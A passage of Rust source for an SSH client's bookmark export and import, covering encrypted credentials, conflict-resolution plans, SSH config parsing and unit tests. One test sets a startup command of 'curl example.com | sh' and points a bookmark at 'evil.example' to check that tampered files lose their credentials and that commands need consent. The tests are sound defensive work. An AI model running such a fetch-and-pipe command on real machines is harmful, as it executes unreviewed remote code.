//! Bookmark export and import.
//!
//! Export writes one versioned JSON file. Credentials are left out unless the user opts in, and
//! then they are encrypted with a passphrase (see `crate::crypto`). Import never overwrites
//! silently: it builds an [`ImportPlan`] that the UI shows as a preview, with a per-bookmark
//! choice for every conflict, and only [`ImportPlan::apply`] changes the store.

use std::collections::{BTreeMap, HashMap, HashSet};

use anyhow::{Result, anyhow, bail};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use uuid::Uuid;

use super::model::{Bookmark, Group};
use super::store::BookmarkStore;
use super::{electerm, ssh_config};
use crate::crypto::{self, EncryptedBlob};
use crate::i18n::{t, tf};
use crate::secrets::SecretSet;

/// 2: SSH agent logins, jump hosts and port forwards.
pub const EXPORT_SCHEMA_VERSION: u32 = 2;
pub const EXPORT_APP: &str = "peler";

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct ExportFile {
    pub schema_version: u32,
    pub exported_at: DateTime<Utc>,
    #[serde(default)]
    pub app: String,
    pub groups: Vec<Group>,
    pub bookmarks: Vec<Bookmark>,
    /// Encrypted `BTreeMap<Uuid, CredentialEntry>`; absent when credentials were not exported.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub credentials: Option<EncryptedBlob>,
}

/// Largest file accepted for import.
pub const MAX_IMPORT_BYTES: u64 = 10 * 1024 * 1024;

/// One bookmark's exported credentials, bound to the address they were saved for. The bookmark
/// list in an export is not encrypted, so if it is edited to point a bookmark elsewhere, the
/// credentials are not handed to the new address.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct CredentialEntry {
    pub host: String,
    pub port: u16,
    pub username: String,
    #[serde(flatten)]
    pub secrets: SecretSet,
}

impl CredentialEntry {
    fn for_bookmark(b: &Bookmark, secrets: SecretSet) -> Self {
        Self {
            host: b.host.trim().to_string(),
            port: b.port,
            username: b.username.trim().to_string(),
            secrets,
        }
    }

    fn matches(&self, b: &Bookmark) -> bool {
        self.host.trim().eq_ignore_ascii_case(b.host.trim())
            && self.port == b.port
            && self.username.trim() == b.username.trim()
    }
}

#[derive(Deserialize)]
#[serde(untagged)]
enum StoredCredential {
    Bound(CredentialEntry),
    /// Exports made before credentials were bound to an address.
    Legacy(SecretSet),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum ExportScope {
    All,
    /// A group and everything nested in it.
    Group(Uuid),
    Selected(Vec<Uuid>),
}

/// The bookmarks an export of `scope` holds.
fn in_scope<'a>(
    store: &'a BookmarkStore,
    scope: &'a ExportScope,
) -> impl Iterator<Item = &'a Bookmark> + 'a {
    let groups = match scope {
        ExportScope::Group(gid) => store.group_and_descendants(*gid),
        _ => HashSet::new(),
    };
    store.bookmarks.iter().filter(move |b| match scope {
        ExportScope::All => true,
        ExportScope::Group(_) => b.group.is_some_and(|g| groups.contains(&g)),
        ExportScope::Selected(ids) => ids.contains(&b.id),
    })
}

/// Builds an export. `secrets` provides each exported bookmark's credentials and is only called
/// when `passphrase` is given; an error reading them fails the export (rather than silently
/// leaving credentials out).
pub fn export(
    store: &BookmarkStore,
    scope: &ExportScope,
    passphrase: Option<&str>,
    mut secrets: impl FnMut(Uuid) -> Result<SecretSet>,
) -> Result<ExportFile> {
    let bookmarks: Vec<Bookmark> = in_scope(store, scope).cloned().collect();

    // Keep every group on the path to an exported bookmark so the tree survives the trip,
    // plus all sub-groups of an exported group (even empty ones).
    let mut keep: HashSet<Uuid> = match scope {
        ExportScope::All => store.groups.iter().map(|g| g.id).collect(),
        ExportScope::Group(gid) => store.group_and_descendants(*gid),
        ExportScope::Selected(_) => HashSet::new(),
    };
    let starts: Vec<Uuid> = bookmarks
        .iter()
        .filter_map(|b| b.group)
        .chain(keep.clone())
        .collect();
    for start in starts {
        let mut cur = Some(start);
        while let Some(gid) = cur {
            if !keep.insert(gid) && gid != start {
                break;
            }
            cur = store.group(gid).and_then(|g| g.parent);
        }
    }
    let groups: Vec<Group> = store
        .groups
        .iter()
        .filter(|g| keep.contains(&g.id))
        .cloned()
        .collect();

    let credentials = match passphrase {
        Some(pass) => {
            let mut map: BTreeMap<Uuid, CredentialEntry> = BTreeMap::new();
            for b in &bookmarks {
                let set = secrets(b.id).map_err(|e| {
                    anyhow!(
                        "{}",
                        tf(
                            "Could not read the saved credentials of {} from the Keychain: {}",
                            &[&b.display_name(), &format!("{e:#}")]
                        )
                    )
                })?;
                if !set.is_empty() {
                    map.insert(b.id, CredentialEntry::for_bookmark(b, set));
                }
            }
            let plain = serde_json::to_vec(&map)?;
            Some(crypto::encrypt(pass, &plain)?)
        }
        None => None,
    };

    Ok(ExportFile {
        schema_version: EXPORT_SCHEMA_VERSION,
        exported_at: Utc::now(),
        app: EXPORT_APP.into(),
        groups,
        bookmarks,
        credentials,
    })
}

// ----- import ---------------------------------------------------------------------------------

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SourceKind {
    Peler,
    Electerm,
    SshConfig,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum MatchedBy {
    Id,
    /// Same host, port and user.
    Endpoint,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum ItemStatus {
    New,
    /// Already present with the same content: nothing to do.
    Identical {
        existing: Uuid,
    },
    Conflict {
        existing: Uuid,
        matched_by: MatchedBy,
    },
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Resolution {
    Add,
    Skip,
    Overwrite,
    KeepBoth,
}

#[derive(Clone, Debug)]
pub struct ImportItem {
    pub incoming: Bookmark,
    /// For a conflict whose address differs: the existing bookmark's address.
    pub existing_address: Option<String>,
    /// Group path of the incoming bookmark, for display.
    pub group_path: String,
    pub secrets: SecretSet,
    pub status: ItemStatus,
    pub resolution: Resolution,
    /// Overwriting the existing bookmark keeps the pasted key it has in the Keychain.
    pub keeps_key: bool,
}

/// Parsed import file, before the user decides how to resolve conflicts.
#[derive(Clone, Debug)]
pub struct ImportPlan {
    pub kind: SourceKind,
    /// Incoming groups in file order (ids as in the file).
    pub groups: Vec<Group>,
    pub items: Vec<ImportItem>,
    /// Encrypted credentials still waiting for the passphrase.
    pub encrypted_credentials: Option<EncryptedBlob>,
    pub warnings: Vec<String>,
    /// Import the bookmarks' startup commands. Off by default: they run on the server as soon
    /// as the bookmark connects, so they need a deliberate yes.
    pub import_startup_commands: bool,
}

/// A parsed but not yet planned import (format-specific readers produce this).
#[derive(Debug)]
pub struct Incoming {
    pub kind: SourceKind,
    pub groups: Vec<Group>,
    pub bookmarks: Vec<Bookmark>,
    pub secrets: HashMap<Uuid, SecretSet>,
    pub encrypted_credentials: Option<EncryptedBlob>,
    pub warnings: Vec<String>,
}

/// Detects the file format and parses it. `ssh_config_name` hints that a non-JSON file should
/// be read as an OpenSSH config.
pub fn read_import(data: &[u8]) -> Result<Incoming> {
    if data.len() as u64 > MAX_IMPORT_BYTES {
        bail!(
            "{}",
            tf(
                "The file is too large to be a connection export (more than {} MB).",
                &[&(MAX_IMPORT_BYTES / 1024 / 1024).to_string()]
            )
        );
    }
    let text =
        std::str::from_utf8(data).map_err(|_| anyhow!("{}", t("The file is not UTF-8 text.")))?;
    let value: serde_json::Value = match serde_json::from_str(text) {
        Ok(v) => v,
        Err(json_err) => {
            let hosts = ssh_config::parse_str(text);
            if !hosts.is_empty() {
                return Ok(from_ssh_config(&hosts));
            }
            bail!(
                "{}",
                tf(
                    "The file is not valid JSON or an SSH config file: {}",
                    &[&json_err.to_string()]
                )
            );
        }
    };
    if value.get("schema_version").is_some() {
        return read_peler(value);
    }
    if electerm::looks_like_electerm(&value) {
        return electerm::read(&value);
    }
    bail!(
        "{}",
        t(
            "Unrecognized file format: expected a Peler export, an Electerm export or an SSH config."
        )
    )
}

fn read_peler(value: serde_json::Value) -> Result<Incoming> {
    let version = value
        .get("schema_version")
        .and_then(|v| v.as_u64())
        .unwrap_or(0);
    if version > EXPORT_SCHEMA_VERSION as u64 {
        bail!(
            "{}",
            tf(
                "This file was exported by a newer version of peler (schema {}); this version reads up to schema {}. Please update the app.",
                &[&version.to_string(), &EXPORT_SCHEMA_VERSION.to_string()]
            )
        );
    }
    if version == 0 {
        bail!(
            "{}",
            tf(
                "The export file is damaged or incomplete: {}",
                &["schema_version"]
            )
        );
    }
    let file: ExportFile = serde_json::from_value(value).map_err(|e| {
        anyhow!(
            "{}",
            tf(
                "The export file is damaged or incomplete: {}",
                &[&e.to_string()]
            )
        )
    })?;
    let mut warnings = Vec::new();
    let ids: HashSet<Uuid> = file.groups.iter().map(|g| g.id).collect();
    if file
        .bookmarks
        .iter()
        .any(|b| b.group.is_some_and(|g| !ids.contains(&g)))
    {
        warnings.push(
            t("Some connections refer to missing groups; they will be placed at the top level.")
                .into(),
        );
    }
    Ok(Incoming {
        kind: SourceKind::Peler,
        groups: file.groups,
        bookmarks: file.bookmarks,
        secrets: HashMap::new(),
        encrypted_credentials: file.credentials,
        warnings,
    })
}

/// Converts `~/.ssh/config` hosts into bookmarks inside an "SSH config" group.
pub fn from_ssh_config(hosts: &[ssh_config::SshConfigHost]) -> Incoming {
    let group = Group::new("SSH config", None);
    // Stable id per alias so re-importing the same config matches by id.
    let id_of = |alias: &str| {
        Uuid::new_v5(
            &Uuid::NAMESPACE_URL,
            format!("ssh-config:{alias}").as_bytes(),
        )
    };
    let aliases: HashSet<&str> = hosts.iter().map(|h| h.alias.as_str()).collect();
    let mut warnings = Vec::new();
    let mut bookmarks: Vec<Bookmark> = hosts
        .iter()
        .map(|h| Bookmark {
            id: id_of(&h.alias),
            name: h.alias.clone(),
            host: h.hostname.clone().unwrap_or_else(|| h.alias.clone()),
            port: h.port.unwrap_or(super::DEFAULT_PORT),
            username: h.user.clone().unwrap_or_default(),
            // A key file named in the config wins; otherwise the agent it names.
            auth: match (&h.identity_file, &h.identity_agent) {
                (Some(p), _) => super::Auth::Key { path: p.clone() },
                (None, Some(socket)) => super::Auth::Agent {
                    socket: socket.clone(),
                },
                (None, None) => super::Auth::Password,
            },
            forwards: h.forwards.clone(),
            group: Some(group.id),
            ..Default::default()
        })
        .collect();
    // ProxyJump a,b: the connection goes through b, and b through a (when b names no jump of
    // its own). Hops must be hosts of the same config.
    for h in hosts.iter().filter(|h| !h.proxy_jump.is_empty()) {
        if let Some(missing) = h
            .proxy_jump
            .iter()
            .find(|hop| !aliases.contains(hop.as_str()))
        {
            warnings.push(tf(
                "{}: the jump host {} is not a Host in the config; choose its jump host by hand.",
                &[&h.alias, missing],
            ));
            continue;
        }
        let mut links = vec![(h.alias.as_str(), h.proxy_jump.last().unwrap().as_str())];
        for pair in h.proxy_jump.windows(2) {
            links.push((pair[1].as_str(), pair[0].as_str()));
        }
        for (from, to) in links {
            if let Some(b) = bookmarks.iter_mut().find(|b| b.id == id_of(from))
                && b.jump.is_none()
                && from != to
            {
                b.jump = Some(id_of(to));
            }
        }
    }
    Incoming {
        kind: SourceKind::SshConfig,
        groups: vec![group],
        bookmarks,
        secrets: HashMap::new(),
        encrypted_credentials: None,
        warnings,
    }
}

impl ImportPlan {
    /// Compares incoming bookmarks with the store and proposes a default resolution: new ones
    /// are added, identical ones skipped, and conflicts skipped until the user decides.
    pub fn new(incoming: Incoming, store: &BookmarkStore) -> Self {
        let group_map = map_groups(&incoming.groups, store);
        let mut temp = store.clone();
        let names: HashMap<Uuid, String> = {
            for g in &incoming.groups {
                if !temp.groups.iter().any(|x| x.id == group_map[&g.id]) {
                    temp.groups.push(Group {
                        id: group_map[&g.id],
                        name: g.name.clone(),
                        parent: g.parent.and_then(|p| group_map.get(&p).copied()),
                    });
                }
            }
            incoming
                .groups
                .iter()
                .map(|g| (g.id, temp.group_path(Some(group_map[&g.id]))))
                .collect()
        };

        let mut items = Vec::new();
        let mut endpoint_taken = HashSet::new();
        for mut b in incoming.bookmarks {
            let group_path = b
                .group
                .and_then(|g| names.get(&g).cloned())
                .unwrap_or_default();
            b.group = b.group.and_then(|g| group_map.get(&g).copied());
            let secrets = incoming.secrets.get(&b.id).cloned().unwrap_or_default();
            let existing = store
                .bookmark(b.id)
                .map(|e| (e, MatchedBy::Id))
                .or_else(|| {
                    store
                        .bookmarks
                        .iter()
                        .find(|e| e.same_endpoint(&b) && !endpoint_taken.contains(&e.id))
                        .map(|e| (e, MatchedBy::Endpoint))
                });
            let existing_address = existing
                .map(|(e, _)| e.address())
                .filter(|a| *a != b.address());
            let keeps_key = existing.is_some_and(|(e, _)| {
                matches!(e.auth, super::Auth::KeychainKey) && e.same_endpoint(&b)
            });
            let status = match existing {
                Some((e, by)) => {
                    endpoint_taken.insert(e.id);
                    let same = Bookmark {
                        id: e.id,
                        ..b.clone()
                    } == *e;
                    if same && secrets.is_empty() {
                        ItemStatus::Identical { existing: e.id }
                    } else {
                        ItemStatus::Conflict {
                            existing: e.id,
                            matched_by: by,
                        }
                    }
                }
                None => ItemStatus::New,
            };
            let resolution = match status {
                ItemStatus::New => Resolution::Add,
                _ => Resolution::Skip,
            };
            items.push(ImportItem {
                incoming: b,
                existing_address,
                group_path,
                secrets,
                status,
                resolution,
                keeps_key,
            });
        }

        ImportPlan {
            kind: incoming.kind,
            groups: incoming.groups,
            items,
            encrypted_credentials: incoming.encrypted_credentials,
            warnings: incoming.warnings,
            import_startup_commands: false,
        }
    }

    /// Decrypts the exported credentials and attaches them to the matching items.
    pub fn unlock_credentials(&mut self, passphrase: &str) -> Result<usize> {
        let Some(blob) = &self.encrypted_credentials else {
            return Ok(0);
        };
        let plain = crypto::decrypt(passphrase, blob)?;
        self.attach_credentials(&plain)
    }

    /// Attaches decrypted credentials (see `crypto::decrypt`, which is slow and best run off the
    /// UI thread) to the items they belong to. Credentials saved for a different address than
    /// the bookmark now has in the file are dropped.
    pub fn attach_credentials(&mut self, plain: &[u8]) -> Result<usize> {
        let map: BTreeMap<Uuid, StoredCredential> =
            serde_json::from_slice(plain).map_err(|_| {
                anyhow!(
                    "{}",
                    t("The encrypted credentials in the file are damaged.")
                )
            })?;
        let (mut n, mut mismatched, mut legacy) = (0, 0, false);
        for item in &mut self.items {
            let secrets = match map.get(&item.incoming.id) {
                None => continue,
                Some(StoredCredential::Bound(entry)) if !entry.matches(&item.incoming) => {
                    mismatched += 1;
                    continue;
                }
                Some(StoredCredential::Bound(entry)) => entry.secrets.clone(),
                Some(StoredCredential::Legacy(set)) => {
                    legacy = true;
                    set.clone()
                }
            };
            item.secrets = secrets;
            n += 1;
            // Identical bookmark but new credentials: offer to update.
            if let ItemStatus::Identical { existing } = item.status {
                item.status = ItemStatus::Conflict {
                    existing,
                    matched_by: MatchedBy::Id,
                };
            }
        }
        if mismatched > 0 {
            self.warnings.push(tf(
                "{} saved credential(s) were left out: the connection's address in the file differs from the address they were saved for.",
                &[&mismatched.to_string()],
            ));
        }
        if legacy {
            self.warnings.push(
                t("This file is from an older version: check each connection's address before connecting with the imported credentials.")
                    .into(),
            );
        }
        self.encrypted_credentials = None;
        Ok(n)
    }

    /// Settles the key files that came along in the file: a connection keeps its key file when
    /// this Mac has the same one at that path (`local` reads it), and otherwise logs in with the
    /// copy from the file, saved in the Keychain like a pasted key.
    pub fn adopt_key_files(&mut self, local: impl Fn(&str) -> Option<String>) {
        for item in &mut self.items {
            let super::Auth::Key { path } = &item.incoming.auth else {
                continue;
            };
            let Some(key) = &item.secrets.private_key else {
                continue;
            };
            if local(path).is_some_and(|here| here.trim() == key.trim()) {
                item.secrets.private_key = None;
            } else {
                item.incoming.auth = super::Auth::KeychainKey;
            }
        }
    }

    /// Bookmarks to be imported that carry a startup command.
    pub fn startup_command_count(&self) -> usize {
        self.items
            .iter()
            .filter(|i| !i.incoming.startup_command.trim().is_empty())
            .filter(|i| {
                !matches!(
                    (&i.status, i.resolution),
                    (ItemStatus::Identical { .. }, _) | (_, Resolution::Skip)
                )
            })
            .count()
    }

    /// Connections that will be imported to log in with a pasted key the file doesn't carry
    /// (an older export, without credentials): they need the key pasted again before they can
    /// connect. None while the file's credentials are still locked, as the keys may be there.
    pub fn keys_missing(&self) -> usize {
        if self.encrypted_credentials.is_some() {
            return 0;
        }
        self.items
            .iter()
            .filter(|i| matches!(i.incoming.auth, super::Auth::KeychainKey))
            .filter(|i| i.secrets.private_key.is_none())
            .filter(|i| match (&i.status, i.resolution) {
                (ItemStatus::Identical { .. }, _) | (_, Resolution::Skip) => false,
                (ItemStatus::Conflict { .. }, Resolution::Overwrite) => !i.keeps_key,
                _ => true,
            })
            .count()
    }

    pub fn conflicts(&self) -> usize {
        self.items
            .iter()
            .filter(|i| matches!(i.status, ItemStatus::Conflict { .. }))
            .count()
    }

    /// Sets the same resolution on every conflicting item.
    pub fn resolve_all_conflicts(&mut self, r: Resolution) {
        for item in &mut self.items {
            if matches!(item.status, ItemStatus::Conflict { .. }) {
                item.resolution = r;
            }
        }
    }

    /// Applies the plan. Returns counts and the secrets the caller must store in the Keychain
    /// (keyed by the bookmark id they belong to after import).
    pub fn apply(&self, store: &mut BookmarkStore) -> ImportOutcome {
        let group_map = map_groups(&self.groups, store);
        for g in &self.groups {
            let id = group_map[&g.id];
            if store.group(id).is_none() {
                store.groups.push(Group {
                    id,
                    name: g.name.clone(),
                    parent: g.parent.and_then(|p| group_map.get(&p).copied()),
                });
            }
        }

        let mut out = ImportOutcome::default();
        // Where each imported connection ended up, for the jump hosts that point at them.
        let mut placed: HashMap<Uuid, Uuid> = HashMap::new();
        let mut written: Vec<Uuid> = Vec::new();
        for item in &self.items {
            match &item.status {
                ItemStatus::Identical { existing } | ItemStatus::Conflict { existing, .. } => {
                    placed.insert(item.incoming.id, *existing);
                }
                ItemStatus::New => {}
            }
            let mut b = item.incoming.clone();
            if !self.import_startup_commands {
                b.startup_command = match &item.status {
                    // An overwritten bookmark keeps the command it already had.
                    ItemStatus::Conflict { existing, .. }
                        if item.resolution == Resolution::Overwrite =>
                    {
                        store
                            .bookmark(*existing)
                            .map(|e| e.startup_command.clone())
                            .unwrap_or_default()
                    }
                    _ => String::new(),
                };
            }
            let target_id = match (&item.status, item.resolution) {
                (_, Resolution::Skip) | (ItemStatus::Identical { .. }, _) => {
                    out.skipped += 1;
                    continue;
                }
                (ItemStatus::Conflict { existing, .. }, Resolution::Overwrite) => {
                    // Keep the existing id so its Keychain items stay attached, unless the
                    // address changes: then the old credentials must not follow it.
                    if store
                        .bookmark(*existing)
                        .is_some_and(|e| !e.same_endpoint(&b))
                    {
                        out.clear_secrets.push(*existing);
                    }
                    b.id = *existing;
                    store.upsert_bookmark(b);
                    out.updated += 1;
                    *existing
                }
                (_, Resolution::KeepBoth | Resolution::Add | Resolution::Overwrite) => {
                    if store.bookmark(b.id).is_some() {
                        b.id = Uuid::new_v4();
                    }
                    let id = b.id;
                    store.bookmarks.push(b);
                    out.added += 1;
                    id
                }
            };
            placed.insert(item.incoming.id, target_id);
            written.push(target_id);
            if !item.secrets.is_empty() {
                out.secrets.push((target_id, item.secrets.clone()));
            }
        }
        for id in written {
            if let Some(b) = store.bookmarks.iter_mut().find(|b| b.id == id)
                && let Some(jump) = b.jump
            {
                b.jump = placed.get(&jump).copied().or(Some(jump));
            }
        }
        store.sanitize();
        out
    }

    /// Counts for the preview: (added, changed, skipped).
    pub fn summary(&self) -> (usize, usize, usize) {
        let (mut add, mut change, mut skip) = (0, 0, 0);
        for i in &self.items {
            match (&i.status, i.resolution) {
                (ItemStatus::Identical { .. }, _) | (_, Resolution::Skip) => skip += 1,
                (ItemStatus::Conflict { .. }, Resolution::Overwrite) => change += 1,
                _ => add += 1,
            }
        }
        (add, change, skip)
    }
}

#[derive(Debug, Default)]
pub struct ImportOutcome {
    pub added: usize,
    pub updated: usize,
    pub skipped: usize,
    pub secrets: Vec<(Uuid, SecretSet)>,
    /// Bookmarks whose saved credentials must be removed first (their address changed).
    pub clear_secrets: Vec<Uuid>,
}

/// Maps incoming group ids to local ids: same id if it exists locally, otherwise a local group
/// with the same name under the same (mapped) parent, otherwise the incoming id (or a fresh id
/// when that id is taken by a different group).
fn map_groups(groups: &[Group], store: &BookmarkStore) -> HashMap<Uuid, Uuid> {
    let mut map: HashMap<Uuid, Uuid> = HashMap::new();
    let incoming_ids: HashSet<Uuid> = groups.iter().map(|g| g.id).collect();
    // Resolve parents before children regardless of file order.
    let mut pending: Vec<&Group> = groups.iter().collect();
    let mut guard = 0;
    while !pending.is_empty() && guard <= groups.len() {
        guard += 1;
        pending.retain(|g| {
            let parent_ready = g
                .parent
                .is_none_or(|p| map.contains_key(&p) || !incoming_ids.contains(&p));
            if !parent_ready {
                return true;
            }
            let parent = g.parent.and_then(|p| map.get(&p).copied());
            let local = if store.group(g.id).is_some() {
                g.id
            } else if let Some(same) = store
                .groups
                .iter()
                .find(|x| x.parent == parent && x.name == g.name)
            {
                same.id
            } else {
                g.id
            };
            map.insert(g.id, local);
            false
        });
    }
    for g in pending {
        map.insert(g.id, g.id); // cycle in the file: sanitize() will detach it
    }
    map
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::bookmarks::Auth;

    fn sample_store() -> BookmarkStore {
        let mut s = BookmarkStore::default();
        let prod = s.add_group("Production", None);
        let db = s.add_group("Databases", Some(prod));
        let _empty = s.add_group("Empty", Some(prod));
        s.add_group("Staging", None);
        s.upsert_bookmark(Bookmark {
            name: "web-1".into(),
            host: "10.0.0.1".into(),
            username: "deploy".into(),
            group: Some(prod),
            tags: vec!["nginx".into()],
            notes: "front".into(),
            start_dir: "/var/www".into(),
            startup_command: "uptime".into(),
            ..Default::default()
        });
        s.upsert_bookmark(Bookmark {
            name: "pg".into(),
            host: "db.internal".into(),
            port: 2222,
            username: "postgres".into(),
            auth: Auth::Key {
                path: "~/.ssh/id_ed25519".into(),
            },
            group: Some(db),
            ..Default::default()
        });
        s.upsert_bookmark(Bookmark {
            name: "loose".into(),
            host: "1.2.3.4".into(),
            ..Default::default()
        });
        s
    }

    fn secrets_for(store: &BookmarkStore) -> HashMap<Uuid, SecretSet> {
        let mut m = HashMap::new();
        m.insert(
            store.bookmarks[0].id,
            SecretSet {
                password: Some("hunter2".into()),
                ..Default::default()
            },
        );
        m.insert(
            store.bookmarks[1].id,
            SecretSet {
                passphrase: Some("key pass".into()),
                ..Default::default()
            },
        );
        m
    }

    #[test]
    fn round_trip_with_encrypted_credentials_is_identical() {
        let mut src = sample_store();
        src.bookmarks[2].auth = Auth::KeychainKey;
        let mut secrets = secrets_for(&src);
        secrets.insert(
            src.bookmarks[2].id,
            SecretSet {
                private_key: Some("PASTED KEY".into()),
                ..Default::default()
            },
        );
        let file = export(&src, &ExportScope::All, Some("correct horse"), |id| {
            Ok(secrets.get(&id).cloned().unwrap_or_default())
        })
        .unwrap();
        let json = serde_json::to_vec_pretty(&file).unwrap();
        let text = String::from_utf8(json.clone()).unwrap();
        assert!(
            !text.contains("hunter2") && !text.contains("key pass") && !text.contains("PASTED"),
            "secrets must be encrypted"
        );

        let mut dst = BookmarkStore::default();
        let mut plan = ImportPlan::new(read_import(&json).unwrap(), &dst);
        assert!(plan.unlock_credentials("wrong").is_err());
        assert_eq!(plan.keys_missing(), 0, "still locked in the file");
        assert_eq!(plan.unlock_credentials("correct horse").unwrap(), 3);
        assert_eq!(plan.keys_missing(), 0);
        plan.import_startup_commands = true;
        let out = plan.apply(&mut dst);
        assert_eq!((out.added, out.updated, out.skipped), (3, 0, 0));
        assert_eq!(dst, src, "store after import must equal the exported store");
        let got: HashMap<Uuid, SecretSet> = out.secrets.into_iter().collect();
        assert_eq!(got, secrets);

        // Importing the same file again changes nothing.
        let plan = ImportPlan::new(read_import(&json).unwrap(), &dst);
        assert_eq!(plan.summary(), (0, 0, 3));
        let before = dst.clone();
        plan.apply(&mut dst);
        assert_eq!(dst, before);
    }

    #[test]
    fn credentials_stay_with_their_address_and_commands_need_consent() {
        let mut src = sample_store();
        src.bookmarks[0].startup_command = "curl example.com | sh".into();
        let secrets = secrets_for(&src);
        let file = export(&src, &ExportScope::All, Some("correct horse"), |id| {
            Ok(secrets.get(&id).cloned().unwrap_or_default())
        })
        .unwrap();
        // Someone edits the unencrypted bookmark list to point web-1 at their own server.
        let mut v = serde_json::to_value(&file).unwrap();
        v["bookmarks"][0]["host"] = "evil.example".into();
        let json = serde_json::to_vec(&v).unwrap();

        // Into an empty store: the moved bookmark loses its password, the other keeps its own.
        let mut dst = BookmarkStore::default();
        let mut plan = ImportPlan::new(read_import(&json).unwrap(), &dst);
        assert_eq!(plan.unlock_credentials("correct horse").unwrap(), 1);
        assert!(plan.warnings.iter().any(|w| w.contains('1')));
        assert_eq!(plan.startup_command_count(), 1);
        let out = plan.apply(&mut dst);
        assert!(out.secrets.iter().all(|(id, _)| *id != src.bookmarks[0].id));
        assert!(
            dst.bookmarks.iter().all(|b| b.startup_command.is_empty()),
            "not without consent"
        );

        // Over the original store: overwriting with a new address drops the old credentials.
        let mut local = src.clone();
        let mut plan = ImportPlan::new(read_import(&json).unwrap(), &local);
        plan.resolve_all_conflicts(Resolution::Overwrite);
        let web = plan
            .items
            .iter()
            .find(|i| i.incoming.id == src.bookmarks[0].id)
            .unwrap();
        assert_eq!(web.existing_address.as_deref(), Some("deploy@10.0.0.1"));
        plan.import_startup_commands = true;
        let out = plan.apply(&mut local);
        assert_eq!(out.clear_secrets, [src.bookmarks[0].id]);
        assert_eq!(local.bookmarks[0].startup_command, "curl example.com | sh");

        // A file far too large is refused before parsing.
        let big = vec![b' '; MAX_IMPORT_BYTES as usize + 1];
        assert!(read_import(&big).is_err());
    }

    #[test]
    fn export_without_passphrase_has_no_credentials() {
        let src = sample_store();
        let file = export(&src, &ExportScope::All, None, |_| {
            panic!("must not read secrets")
        })
        .unwrap();
        assert!(file.credentials.is_none());
        let v = serde_json::to_value(&file).unwrap();
        for key in ["schema_version", "exported_at", "groups", "bookmarks"] {
            assert!(v.get(key).is_some(), "missing {key}");
        }
    }

    #[test]
    fn export_scopes() {
        let src = sample_store();
        let prod = src.groups[0].id;
        let db = src.groups[1].id;
        let f = export(&src, &ExportScope::Group(db), None, |_| {
            Ok(SecretSet::default())
        })
        .unwrap();
        assert_eq!(f.bookmarks.len(), 1);
        let gids: Vec<_> = f.groups.iter().map(|g| g.id).collect();
        assert_eq!(gids, [prod, db], "ancestors are kept so the path survives");

        let f = export(&src, &ExportScope::Group(prod), None, |_| {
            Ok(SecretSet::default())
        })
        .unwrap();
        assert_eq!(f.bookmarks.len(), 2);
        assert_eq!(f.groups.len(), 3, "includes the empty sub-group");

        let loose = src.bookmarks[2].id;
        let f = export(&src, &ExportScope::Selected(vec![loose]), None, |_| {
            Ok(SecretSet::default())
        })
        .unwrap();
        assert_eq!(f.bookmarks.len(), 1);
        assert!(f.groups.is_empty());
    }

    #[test]
    fn pasted_keys_missing_from_a_file_are_flagged() {
        let mut src = sample_store();
        src.bookmarks[2].auth = Auth::KeychainKey;
        let loose = src.bookmarks[2].id;
        // A file from an older version, exported without credentials.
        let file = export(&src, &ExportScope::All, None, |_| unreachable!()).unwrap();
        let json = serde_json::to_vec(&file).unwrap();
        // On another Mac: the key isn't in the file, nor in that Mac's Keychain.
        let mut plan = ImportPlan::new(read_import(&json).unwrap(), &BookmarkStore::default());
        assert_eq!(plan.keys_missing(), 1);
        let i = plan
            .items
            .iter()
            .position(|i| i.incoming.id == loose)
            .unwrap();
        plan.items[i].secrets.private_key = Some("KEY".into());
        assert_eq!(plan.keys_missing(), 0, "the file carried it");

        // Back on the Mac it came from, the Keychain still has it.
        let mut local = src.clone();
        local.bookmarks[2].notes = "edited".into();
        let mut plan = ImportPlan::new(read_import(&json).unwrap(), &local);
        let i = plan
            .items
            .iter()
            .position(|i| i.incoming.id == loose)
            .unwrap();
        plan.items[i].resolution = Resolution::Overwrite;
        assert_eq!(plan.keys_missing(), 0, "overwriting keeps the saved key");
        // ...unless the address changes, which drops it.
        plan.items[i].incoming.host = "5.6.7.8".into();
        plan.items[i].keeps_key = false;
        assert_eq!(plan.keys_missing(), 1);
        plan.items[i].resolution = Resolution::Skip;
        assert_eq!(plan.keys_missing(), 0);
    }

    #[test]
    fn key_files_travel_with_the_export() {
        let src = sample_store();
        let pg = src.bookmarks[1].id; // logs in with ~/.ssh/id_ed25519
        let file = export(&src, &ExportScope::All, Some("correct horse"), |id| {
            Ok(SecretSet {
                private_key: (id == pg).then(|| "KEY FILE TEXT\n".into()),
                ..Default::default()
            })
        })
        .unwrap();
        let json = serde_json::to_vec(&file).unwrap();
        let plan_on = |local: Option<&'static str>| {
            let mut plan = ImportPlan::new(read_import(&json).unwrap(), &BookmarkStore::default());
            plan.unlock_credentials("correct horse").unwrap();
            plan.adopt_key_files(|path| {
                assert_eq!(path, "~/.ssh/id_ed25519");
                local.map(String::from)
            });
            let mut dst = BookmarkStore::default();
            let out = plan.apply(&mut dst);
            (dst.bookmark(pg).unwrap().auth.clone(), out.secrets)
        };

        // This Mac has the same key file: the connection keeps using it.
        let (auth, secrets) = plan_on(Some("KEY FILE TEXT"));
        assert!(matches!(auth, Auth::Key { .. }));
        assert!(secrets.iter().all(|(_, s)| s.private_key.is_none()));

        // It doesn't (or has another key there): the copy goes to the Keychain.
        for local in [None, Some("ANOTHER KEY")] {
            let (auth, secrets) = plan_on(local);
            assert_eq!(auth, Auth::KeychainKey);
            let set = secrets.iter().find(|(id, _)| *id == pg).map(|(_, s)| s);
            assert_eq!(
                set.and_then(|s| s.private_key.as_deref()),
                Some("KEY FILE TEXT\n")
            );
        }
    }

    #[test]
    fn conflicts_by_id_and_endpoint() {
        let mut local = sample_store();
        let src = local.clone();
        // Changed copy of web-1 (same id) and a different-id bookmark to the same endpoint as pg.
        local.bookmarks[0].notes = "local edit".into();
        let pg_endpoint_twin = Bookmark {
            id: Uuid::new_v4(),
            notes: "twin".into(),
            ..src.bookmarks[1].clone()
        };
